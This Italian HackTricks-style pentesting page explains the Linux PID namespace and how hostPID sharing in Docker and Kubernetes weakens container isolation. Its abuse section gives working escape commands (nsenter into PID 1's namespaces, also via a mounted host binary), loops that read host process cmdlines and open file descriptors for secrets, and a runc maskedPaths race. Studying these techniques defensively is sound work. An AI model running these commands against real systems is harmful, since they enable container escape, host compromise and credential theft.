# Namespace PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il namespace PID controlla come i processi sono numerati e quali processi sono visibili. Per questo un container può avere il proprio PID 1 anche se non è una macchina reale. All'interno del namespace, il carico di lavoro vede quello che sembra essere un albero di processi locale. Fuori dal namespace, l'host vede comunque i reali PID dell'host e l'intero panorama dei processi.

Dal punto di vista della sicurezza, il namespace PID è importante perché la visibilità dei processi è preziosa. Una volta che un carico di lavoro può vedere i processi dell'host, può essere in grado di osservare nomi di servizi, argomenti della linea di comando, secret passati negli argomenti dei processi, stato derivato dall'ambiente tramite `/proc`, e potenziali target per l'entrata in altri namespace. Se può fare più che semplicemente vedere quei processi, per esempio inviando segnali o usando ptrace nelle condizioni giuste, il problema diventa molto più serio.

## Funzionamento

Un nuovo namespace PID inizia con la propria numerazione interna dei processi. Il primo processo creato al suo interno diventa PID 1 dal punto di vista del namespace, il che significa anche che ottiene semantiche speciali simili a init per i figli orfani e il comportamento dei segnali. Questo spiega molte stranezze dei container riguardo ai processi init, al reaping dei zombie, e perché a volte vengono usati piccoli init wrapper nei container.

La lezione importante per la sicurezza è che un processo può sembrare isolato perché vede solo il proprio albero di PID, ma quell'isolamento può essere rimosso deliberatamente. Docker espone questo con `--pid=host`, mentre Kubernetes lo fa con `hostPID: true`. Una volta che il container si unisce al namespace PID dell'host, il carico di lavoro vede direttamente i processi dell'host, e molte delle vie di attacco successive diventano molto più realistiche.

## Lab

Per creare manualmente un PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
La shell ora vede una vista dei processi privata. Il flag `--mount-proc` è importante perché monta un'istanza procfs che corrisponde al nuovo PID namespace, rendendo la lista dei processi coerente dall'interno.

Per confrontare il comportamento del container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La differenza è immediata e facile da comprendere, per questo è un buon primo laboratorio per i lettori.

## Utilizzo a runtime

I container normali in Docker, Podman, containerd e CRI-O ottengono il proprio PID namespace. I Pod di Kubernetes di solito ricevono anch'essi una vista PID isolata a meno che il workload non richieda esplicitamente la condivisione del PID dell'host. Gli ambienti LXC/Incus si basano sullo stesso primitivo del kernel, sebbene i casi d'uso con system-container possano esporre alberi di processo più complicati e incoraggiare scorciatoie per il debugging.

La stessa regola vale ovunque: se il runtime sceglie di non isolare il PID namespace, si tratta di una riduzione deliberata del confine del container.

## Misconfigurazioni

La misconfigurazione canonica è la condivisione del PID dell'host. I team spesso la giustificano per debugging, monitoring o per comodità nella gestione dei servizi, ma dovrebbe sempre essere considerata come un'eccezione significativa dal punto di vista della sicurezza. Anche se il container non dispone di una immediata primitive di scrittura sui processi dell'host, la sola visibilità può rivelare molto sul sistema. Una volta aggiunte capacità come `CAP_SYS_PTRACE` o accessi utili a procfs, il rischio aumenta significativamente.

Un altro errore è presumere che, poiché il workload non può killare o ptrace i processi dell'host di default, la condivisione del PID dell'host sia quindi innocua. Tale conclusione ignora il valore dell'enumerazione, la disponibilità di target per l'entrata nel namespace e il modo in cui la visibilità dei PID si combina con altri controlli indeboliti.

## Abuso

Se il PID namespace dell'host è condiviso, un attacker può ispezionare i processi dell'host, raccogliere gli argomenti dei processi, identificare servizi interessanti, individuare PIDs candidati per `nsenter`, o combinare la visibilità dei processi con privilegi correlati a ptrace per interferire con i workload dell'host o vicini. In alcuni casi, il semplice vedere il giusto processo a lunga esecuzione è sufficiente per rimodellare il resto del piano d'attacco.

Il primo passo pratico è sempre confermare che i processi dell'host siano realmente visibili:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una volta che gli host PIDs sono visibili, gli argomenti dei processi e i target di namespace-entry diventano spesso la fonte d'informazione più utile:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Se `nsenter` è disponibile e si dispone di privilegi sufficienti, verifica se un processo dell'host visibile può essere usato come ponte per i namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Anche quando l'accesso è bloccato, la condivisione del PID dell'host è comunque preziosa perché rivela la disposizione dei servizi, i componenti in esecuzione e i processi privilegiati candidati da prendere di mira successivamente.

La visibilità del PID dell'host rende inoltre più realistico l'abuso dei descrittori di file. Se un processo privilegiato dell'host o un carico di lavoro adiacente ha un file sensibile o una socket aperti, l'attaccante potrebbe essere in grado di ispezionare `/proc/<pid>/fd/` e riutilizzare quel handle a seconda della proprietà, delle opzioni di mount di procfs e del modello del servizio bersaglio.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Questi comandi sono utili perché permettono di verificare se `hidepid=1` o `hidepid=2` stanno riducendo la visibilità tra processi e se descrittori chiaramente interessanti, come file segreti aperti, log o socket Unix, sono visibili.

### Esempio completo: host PID + `nsenter`

La condivisione del PID dell'host diventa una host escape diretta quando il processo ha anche privilegi sufficienti per unirsi ai namespace dell'host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Se il comando ha successo, il processo del container viene ora eseguito nei namespace mount, UTS, network, IPC e PID dell'host. L'impatto è la compromissione immediata dell'host.

Anche quando `nsenter` manca, lo stesso risultato può essere ottenuto tramite il binario dell'host se il filesystem dell'host è montato:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Note recenti di runtime

Alcuni attacchi rilevanti per PID-namespace non sono le tradizionali misconfigurazioni `hostPID: true`, ma bug nell'implementazione a runtime riguardanti il modo in cui le protezioni di procfs vengono applicate durante la configurazione del container.

#### `maskedPaths` race verso il procfs dell'host

Nelle versioni vulnerabili di `runc`, un attaccante in grado di controllare l'immagine del container o il workload eseguito con `runc exec` poteva sfruttare una race nella fase di masking sostituendo il `/dev/null` lato container con un symlink verso un percorso procfs sensibile come `/proc/sys/kernel/core_pattern`. Se la race aveva successo, il masked-path bind mount poteva finire sul target sbagliato ed esporre al nuovo container le procfs knobs globali dell'host.

Comando utile per la verifica:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Questo è importante perché l'impatto finale può essere lo stesso di una esposizione diretta di procfs: `core_pattern` o `sysrq-trigger` scrivibili, seguiti dall'esecuzione di codice sull'host o da denial of service.

#### Namespace injection con `insject`

Strumenti di Namespace injection come `insject` mostrano che l'interazione con il PID-namespace non richiede sempre l'ingresso preventivo nel namespace target prima della creazione del processo. Un helper può collegarsi successivamente, usare `setns()` ed eseguire preservando la visibilità nello spazio PID di destinazione:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
This kind of technique matters mainly for advanced debugging, offensive tooling, and post-exploitation workflows where namespace context must be joined after the runtime has already initialized the workload.

### Pattern di abuso di FD correlati

Quando i host PIDs sono visibili, vale la pena evidenziare esplicitamente due pattern. Primo, un processo privilegiato può mantenere un file descriptor sensibile aperto durante `execve()` perché non è stato marcato `O_CLOEXEC`. Secondo, i servizi possono passare file descriptor tramite socket Unix usando `SCM_RIGHTS`. In entrambi i casi l'oggetto interessante non è più il pathname, ma l'handle già aperto che un processo con privilegi inferiori può ereditare o ricevere.

Questo è rilevante nel lavoro con i container perché l'handle può puntare a `docker.sock`, a un log privilegiato, a un file segreto dell'host o a un altro oggetto di alto valore anche quando il percorso stesso non è direttamente raggiungibile dal filesystem del container.

## Controlli

Lo scopo di questi comandi è determinare se il processo ha una vista PID privata o se può già enumerare un panorama di processi molto più ampio.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Se la lista dei processi contiene servizi evidenti dell'host, probabilmente la condivisione dei PID con l'host è già in atto.
- Vedere solo un piccolo albero locale al container è il comportamento normale; vedere `systemd`, `dockerd`, o daemon non correlati non lo è.
- Una volta che i PID dell'host sono visibili, anche informazioni sui processi in sola lettura diventano utili per reconnaissance.

Se scopri un container in esecuzione con la condivisione dei PID dell'host, non considerarlo una differenza puramente cosmetica. È un cambiamento significativo in ciò che il carico di lavoro può osservare e potenzialmente influenzare.
{{#include ../../../../../banners/hacktricks-training.md}}
